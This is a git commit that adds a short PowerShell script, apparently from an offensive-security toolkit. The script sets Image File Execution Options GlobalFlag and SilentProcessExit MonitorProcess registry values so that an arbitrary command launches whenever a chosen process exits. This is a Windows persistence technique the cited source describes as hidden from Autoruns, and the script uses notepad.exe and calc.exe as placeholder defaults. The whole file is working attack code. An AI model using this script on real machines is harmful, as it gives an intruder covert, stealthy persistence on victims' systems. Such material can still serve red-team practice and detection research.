29075acf6eae8eba2916ca5db3c684ca3dff0783
itay migdal <32266629+itaymigdal@users.noreply.github.com>
2021-07-01 19:29:24 +0300

    Add files via upload

---
+++ Persist-SilentProcessExit.ps1
@@ -0,0 +1,11 @@
+﻿# https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
+
+param
+(
+   [string] $terminated_process = "notepad.exe",
+   [string] $Command = "c:\windows\system32\calc.exe"
+)
+
+reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + $terminated_process) /v GlobalFlag /t REG_DWORD /d 512 > $null
+reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\" + $terminated_process) /v ReportingMode /t REG_DWORD /d 1 > $null
+reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\" + $terminated_process) /v MonitorProcess /d $Command > $null
